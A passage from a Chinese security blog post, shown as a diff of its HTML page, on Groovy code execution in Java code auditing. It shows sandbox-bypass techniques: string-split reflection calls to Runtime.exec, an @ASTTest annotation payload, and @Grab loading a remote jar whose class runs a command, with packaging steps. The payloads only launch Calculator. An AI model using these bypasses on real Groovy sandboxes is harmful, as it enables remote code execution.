+        Method ex <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span> <span class="token operator">+</span> <span class="token string">"ec"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ex<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>gr<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ope"</span> <span class="token operator">+</span> <span class="token string">"n -a"</span> <span class="token operator">+</span><span class="token string">" Cal"</span> <span class="token operator">+</span> <span class="token string">"culator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="2-Groovy沙箱Bypass"><a href="#2-Groovy沙箱Bypass" class="headerlink" title="2.Groovy沙箱Bypass"></a>2.Groovy沙箱Bypass</h3><h4 id="AST注解执行断言"><a href="#AST注解执行断言" class="headerlink" title="@AST注解执行断言"></a>@AST注解执行断言</h4><p>参考Groovy的<a href="http://groovy-lang.org/metaprogramming.html" target="_blank" rel="noopener">Meta Programming手册</a>，利用AST注解能够执行断言从而实现代码执行（本地测试无需assert也能触发代码执行）。</p>
+<p>ASTTest.groovy</p>
+<pre class="line-numbers language-groovy"><code class="language-groovy"><span class="token keyword">this</span><span class="token operator">.</span><span class="token keyword">class</span><span class="token operator">.</span>classLoader<span class="token operator">.</span><span class="token function">parseClass</span><span class="token punctuation">(</span><span class="token string">'''
+    @groovy.transform.ASTTest(value={
+        assert Runtime.getRuntime().exec("open -a Calculator")
+    })
+    def x
+'''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/img/Groovy/image-20211102170727475.png" alt="image-20211102170727475"></p>
+<h4 id="Grab注解加载远程恶意类"><a href="#Grab注解加载远程恶意类" class="headerlink" title="@Grab注解加载远程恶意类"></a>@Grab注解加载远程恶意类</h4><p>@Grab注解的详细用法在<a href="http://docs.groovy-lang.org/latest/html/documentation/grape.html" target="_blank" rel="noopener">Dependency management with Grape</a>中有讲到，简单地说，Grape是Groovy内建的一个动态Jar依赖管理程序，允许开发者动态引入不在ClassPath中的函式库。</p>
+<p>DemoGrab.groovy代码:</p>
+<p>请求 <a href="http://127.0.0.1:8888/test/poc/0/poc-0.jar" target="_blank" rel="noopener">http://127.0.0.1:8888/test/poc/0/poc-0.jar</a> 加载Exp类，实例化后执行构造方法里的代码</p>
+<pre class="line-numbers language-groovy"><code class="language-groovy"><span class="token keyword">this</span><span class="token operator">.</span><span class="token keyword">class</span><span class="token operator">.</span>classLoader<span class="token operator">.</span><span class="token function">parseClass</span><span class="token punctuation">(</span><span class="token string">'''
+    @GrabConfig(disableChecksums=true)
+    @GrabResolver(name='Exp', root='http://127.0.0.1:8888/')
+    @Grab(group='test', module='poc', version='0')
+    import Exp;
+'''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Exp.java</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Exp</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token function">Exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"open -a Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
+
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>Javac Exp.java</code> 生成Exp.class</p>
+<p>在src目录下创建META-INF.services目录，并创建org.codehaus.groovy.plugins.Runners文件，文件内容为Exp</p>
+<pre><code>mkdir -p META-INF/services/
+echo Exp &gt; META-INF/services/org.codehaus.groovy.plugins.Runners
+jar cvf poc-0.jar Exp.class META-INF</code></pre><p><img src="/img/Groovy/image-20211102172129340.png" alt="image-20211102172129340"></p>
+<p>将poc-0.jar放到Web目录下，路径在test/poc/0/</p>
+<p><img src="/img/Groovy/image-20211102172404756.png" alt="image-20211102172404756"></p>
+<p>运行DemoGrab.groovy</p>
+<p><img src="/img/Groovy/image-20211102172439128.png" alt="image-20211102172439128"></p>
+<p>成功执行了命令</p>
+<p><img src="/img/Groovy/image-20211102172508620.png" alt="image-20211102172508620"></p>
+<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><code>https://www.mi1k7ea.com/2020/08/26/%E4%BB%8EJenkins-RCE%E7%9C%8BGroovy%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/</code></p>
+
+            </div>
+            <hr />
+
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        <p class="reprint-tip">
+            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
+            <span>转载规则</span>
+        </p>
+        
+            <div class="center-align">
+                <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                    <img alt=""
+                         style="border-width:0"
+                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
+                </a>
+            </div>
+            <br/>
+            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
+                  property="dct:title" rel="dct:type">
+                    《Java代码审计之Groovy代码执行》
+                </span> 由
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2021/11/02/java-dai-ma-shen-ji-zhi-groovy-dai-ma-zhi-xing/" property="cc:attributionName"
+               rel="cc:attributionURL">
+                ske
+            </a> 采用
+            <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                知识共享署名 4.0 国际许可协议
+            </a>进行许可。
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+        </div>
+    </div>
+
+    
+    <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'SkewwG.github.io',
+        owner: 'SkewwG',
+        admin: "SkewwG",
+        id: '2021/11/02/java-dai-ma-shen-ji-zhi-groovy-dai-ma-zhi-xing/',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+    <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments input[type=text],
+    #vcomments input[type=email],
+    #vcomments input[type=url],
+    #vcomments textarea {
+        box-sizing: border-box;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #42b983;
+        font-weight: 500;
+        text-decoration: underline;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div id="vcomments" class="card-content"></div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<!-- <script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script> -->
+
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: '',
+        appKey: '',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'false' === 'true',
+        avatar: 'wavatar',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: '如果你没有GitHub账号，还可以在这里评论啦！'
+    });
+</script>
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/11/17/codeql-xi-lie-zhi-an-zhuang-codeql/">
+                    <div class="card-image">
+                        
+                        <img src="/img/CodeQLInstall/image-20211117214851608.png" class="responsive-img" alt="CodeQL系列之安装CodeQL">
+                        
+                        <span class="card-title">CodeQL系列之安装CodeQL</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            CodeQL系列之安装CodeQL
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2021-11-17
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CodeQL/" class="post-category" target="_blank">
+                                    CodeQL
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CodeQL系列之安装CodeQL/" target="_blank">
+                        <span class="chip bg-color">CodeQL系列之安装CodeQL</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/10/28/java-dai-ma-shen-ji-zhi-fastjson-fan-xu-lie-hua-diao-yong-lian-wan-zheng-fen-xi-guo-cheng/">
+                    <div class="card-image">
+                        
+                        <img src="/img/FastjsonDeserialization/image-20211028172304854.png" class="responsive-img" alt="Java代码审计之Fastjson反序列化调用链完整分析过程">
+                        
+                        <span class="card-title">Java代码审计之Fastjson反序列化调用链完整分析过程</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Java代码审计之Fastjson反序列化调用链完整分析过程
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-10-28
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Java代码审计/" class="post-category" target="_blank">
+                                    Java代码审计
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Java代码审计之Fastjson反序列化调用链完整分析过程/" target="_blank">
+                        <span class="chip bg-color">Java代码审计之Fastjson反序列化调用链完整分析过程</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: ske的博客<br />'
+            + '作者: ske<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () { bodyElement.removeChild(newdiv); }, 200);
+    });
+</script>
+
+    
+
+</main>
+
+
+    <footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            &copy; 2020-~ Ske. 版权所有
+
+            
+            &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+            <span class="white-color">66.7k</span>
+            
+
+            <br>
+            <span id="sitetime"></span>
+
+            
+            
+            <br>
+            
+			<span id="busuanzi_container_site_pv" style='display:none'>
+				<i class="fa fa-heart-o"></i>
+				
+			</span>
+			
+			
+			<span id="busuanzi_container_site_uv" style='display:none'>
+				
+			</span>
+			
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/SkewwG" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:446106525@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+    <a href="http://wpa.qq.com/msgrd?v=3&uin=446106525&site=qq&menu=yes" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+<script language=javascript>
+    function siteTime() {
+        window.setTimeout("siteTime()", 1000);
+        var seconds = 1000;
+        var minutes = seconds * 60;
+        var hours = minutes * 60;
+        var days = hours * 24;
+        var years = days * 365;
+        var today = new Date();
+        var todayYear = today.getFullYear();
+        var todayMonth = today.getMonth() + 1;
+        var todayDate = today.getDate();
+        var todayHour = today.getHours();
+        var todayMinute = today.getMinutes();
+        var todaySecond = today.getSeconds();
+        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+        year - 作为date对象的年份，为4位年份值
+        month - 0-11之间的整数，做为date对象的月份
+        day - 1-31之间的整数，做为date对象的天数
+        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+        minutes - 0-59之间的整数，做为date对象的分钟数
+        seconds - 0-59之间的整数，做为date对象的秒数
+        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+        var t1 = Date.UTC(2020, 11, 25, 00, 00, 00); //北京时间2018-2-13 00:00:00
+        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+        var diff = t2 - t1;
+        var diffYears = Math.floor(diff / years);
+        var diffDays = Math.floor((diff / days) - diffYears * 365);
+        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
+        document.getElementById("sitetime").innerHTML = "本站已运行 " + diffYears + " 年 " + diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+    }/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+    siteTime();
+</script>
+
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+    $(document).ready(function () {
+
+        var int = setInterval(fixCount, 50);
+        var pvcountOffset = 80000;
+        var uvcountOffset = 20000;
+
+        function fixCount() {
+            if (document.getElementById("busuanzi_container_site_pv").style.display != "none") {
+                $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + pvcountOffset);
+                clearInterval(int);
+            }
+            if ($("#busuanzi_container_site_pv").css("display") != "none") {
+                $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + uvcountOffset); // 加上初始数据 
+                clearInterval(int);
+            }
+        }
+    });
+</script>
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <script type="text/javascript"> var OriginTitile = document.title, st; document.addEventListener("visibilitychange", function () { document.hidden ? (document.title = "Σ(っ °Д °;)っ喔哟，崩溃啦！", clearTimeout(st)) : (document.title = "φ(゜▽゜*)♪咦，又好了！", st = setTimeout(function () { document.title = OriginTitile }, 3e3)) })
+    </script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', '');
+</script>
+
+
+
+    
+    <script src="/libs/others/clicklove.js"></script>
+    
+
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+</body>
+
+</html>
